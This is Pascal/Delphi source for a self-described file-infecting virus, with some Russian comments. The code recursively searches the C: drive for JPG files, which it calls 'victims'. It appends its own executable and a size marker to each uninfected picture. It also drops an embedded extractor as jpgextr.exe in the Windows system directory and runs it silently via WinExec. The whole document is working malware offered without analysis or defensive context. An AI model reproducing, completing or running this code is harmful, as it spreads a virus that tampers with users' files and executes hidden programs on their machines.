{
 ************************************************
  The infected file:
                1) Picture (JPG file)
                2) Our virus
                3) The size of a virus (20992)
 ************************************************
}
program jpg;
const
  faHidden                              = $00000002;
  faSysFile                             = $00000004;
  faVolumeID                            = $00000008;
  faDirectory                           = $00000010;
  faAnyFile                             = $0000003F;
  MAX_PATH                              = 260;
  INVALID_HANDLE_VALUE                  = LONGWORD(-1);
  MaxBuf                                = 400000;
  {$i size.inc}
type
  TFileName = type string;

  TFILETIME = record
     dwLowDateTime                      : LongWord;
     dwHighDateTime                     : LongWord;
  end;


{----------------------The WIN32_FIND_DATA structure---------------------------}
  _WIN32_FIND_DATAA = record
      dwFileAttributes                  : LongWord;
      ftCreationTime                    : TFileTime;
      ftLastAccessTime                  : TFileTime;
      ftLastWriteTime                   : TFileTime;
      nFileSizeHigh                     : LongWord;
      nFileSizeLow                      : LongWord;
      dwReserved0                       : LongWord;
      dwReserved1                       : LongWord;
      cFileName: array[0..MAX_PATH - 1]of AnsiChar;
      cAlternateFileName: array[0..13] of AnsiChar;
  end;
  TWin32FindData = _WIN32_FIND_DATAA;
{------------------------------------------------------------------------------}


{--------------------------The SearchRec structure-----------------------------}
  TSearchRec = record
    Time                                : Integer;
    Size                                : Integer;
    Attr                                : Integer;
    Name                                : TFileName;
    ExcludeAttr                         : Integer;
    FindHandle                          : THandle;
    FindData                            : TWin32FindData;
  end;
{------------------------------------------------------------------------------}

{---------------------------Used functions WinApi------------------------------}
function WinExec                      (lpCmdLine: PAnsiChar;
                                       uCmdShow: LongWord):
                                       LongWord; stdcall;external
                                       'kernel32.dll' name 'WinExec';
function GetWindowsDirectorya         (lpBuffer  : PAnsiChar;
                                       uSize     : LongWord):
                                       LongWord; stdcall;external
                                       'kernel32.dll' name'GetWindowsDirectoryA';
function FindFirstFileA               (lpFileName: PChar; var
                                       lpFindFileData: TWIN32FindData):
                                       THandle; stdcall;external
                                       'kernel32.dll' name 'FindFirstFileA';
function FindNextFileA                (hFindFile: THandle; var
                                       lpFindFileData: TWIN32FindData):
                                       LONGBOOL; stdcall;external
                                       'kernel32.dll' name 'FindNextFileA';
function FindCloseA                   (hFindFile: THandle):
                                       LONGBOOL; stdcall;external
                                       'kernel32.dll' name 'FindClose';
function DeleteFile                   (lpFileName: PChar):
                                       LongBool; stdcall;external
                                       'kernel32.dll' name 'DeleteFileA';                                       
{------------------------------------------------------------------------------}


{------------------------Infection of a picture--------------------------------}
procedure infectjpg(jpgfile:string; viruspath:string);
var  Fjpgfile,Fviruspath,Ftemp          : file;
     temp                               : textfile;
     buf                                : array [0..MaxBuf] of byte;
     size,i,jpgsize                     : integer;
     endoffile                          : string;
     bufmetka                           : array [0..6] of byte;
begin
    filemode:=0;
    assignfile(Fviruspath,viruspath);
    reset(Fviruspath,1);
    Seek(Fviruspath,0);
    size:=filesize(Fviruspath);
    BlockRead(Fviruspath,buf,size);
    close(Fviruspath);
    str(size,endoffile);
//    endoffile:=IntToStr(size);

    while Length(endoffile)<>6 do endoffile:=endoffile+' ';

    assign(temp,'c:\tempfile');
    rewrite(temp);
    Write(temp,endoffile);
    close(temp);

    assign(Ftemp,'c:\tempfile');
    reset(Ftemp,1);
    BlockRead(Ftemp,bufmetka,6);
    close(fTemp);

    filemode:=1;
    assignfile(Fjpgfile,jpgfile);
    reset(Fjpgfile,1);
    jpgsize:=filesize(Fjpgfile);
    Seek(Fjpgfile,jpgsize);
    BlockWrite(Fjpgfile,buf,size);
    Seek(Fjpgfile,jpgsize+size);
    BlockWrite(Fjpgfile,bufmetka,6);
    close(Fjpgfile);
    DeleteFile('c:\tempfile');
end;
{------------------------------------------------------------------------------}

{-------------------------------Extraction-------------------------------------}
{Извлекает из себя экстрактор и запускает его, с учетом, что вирус собран из
 двух частей.
     НАШ_ФАЙЛ:
             1) Вирус
             2) Экстрактор
}
procedure ExtrctExtr(pathforextr:string);
var F                                   : file;
    buf                                 : array [0..MaxBuf] of byte;
    FileS                               : integer;
begin
    FileMode:=0;
    Assign(F,ParamStr(0));
    Reset(F,1);
    FileS:=FileSize(f);
    if virussize<>FileS then
    begin
        seek(F,VirusSize);
        blockread(f,Buf,ExtrSize);
    end;
    close(F);

    if virussize<>FileS then
    begin
        FileMode:=1;
        Assign(F, pathforextr);
        rewrite(f,1);
        BlockWrite(F,Buf,ExtrSize);
        Close(f);
        WinExec(Pchar(pathforextr),0);        
    end;
end;
{------------------------------------------------------------------------------}


{--------------------------Check on infection----------------------------------}
function checkJPG(path:string):boolean;
var
    buf                                 : array [0..6] of byte;
    f                                   : file;
    temp,temp1                          : string;
    i,e                                 : integer;
begin
    result:=false;
    filemode:=0;
    Assign(f,path);
    reset(f,1);
    seek(f,Filesize(f)-6);
    BlockRead(f,buf,6);
    close(f);
    temp:='';
    for i:=1 to 6 do temp:=temp+chr(buf[i]);

    for i:=1 to Length(temp) do
         begin
            if temp[i]<>' ' then temp1:=temp1+temp[i];
         end;
    temp:=temp1;
//    i:=StrToInt(temp);
    Val(temp, i, e);
    if i<>0 then result:=true;

end;
{------------------------------------------------------------------------------}


{--------------------------Search of victims-----------------------------------}
procedure FindFiles(StartFolder, Mask: String; List: String;
          ScanSubFolders: Boolean = True);
var
         SearchRec                      : TSearchRec;
         FindResult                     : Integer;
         temp                           : string;
{*****}
function FindMatchingFile(var F: TSearchRec): Integer;
var
         LocalFileTime                  : TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFileA(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
  end;
  Result := 0;
end;
{-----}

{*****}
procedure FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    FindCloseA(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;
{-----}

{*****}
function FindFirst(const Path: string; Attr: Integer;
  var  F: TSearchRec): Integer;
const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFileA(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end else
    Result := GetLastError;
end;
{-----}

{*****}
function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFileA(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;
{-----}

begin

 try
   if StartFolder[Length(StartFolder)]<>'\' then StartFolder:=StartFolder+'\';
   FindResult:=FindFirst(StartFolder+'*.*', faAnyFile, SearchRec);
  try
   while FindResult = 0 do with SearchRec do begin
    if (Attr and faDirectory)<>0 then
    begin
     if ScanSubFolders and (Name<>'.') and (Name<>'..') then
      FindFiles(StartFolder+Name, Mask, List, ScanSubFolders);
    end
    else
     begin
          temp:=name;
          delete(temp,1,Length(temp)-4);
          if temp='.jpg' then
             begin
                List:=StartFolder+Name;
                if checkJPG(list)=false then infectjpg(list,ParamStr(0));
             end;
    end;
    FindResult:=FindNext(SearchRec);
    end;
  finally
   FindClose(SearchRec);
  end;
 finally
 end;
end;
{------------------------------------------------------------------------------}


var
     windir                             : Array[0..144] of char;
begin
     GetWindowsDirectoryA(windir,SizeOf(windir));
     ExtrctExtr(Windir+'\system\jpgextr.exe');
     FindFiles('c:\','*.jpg','');
end.

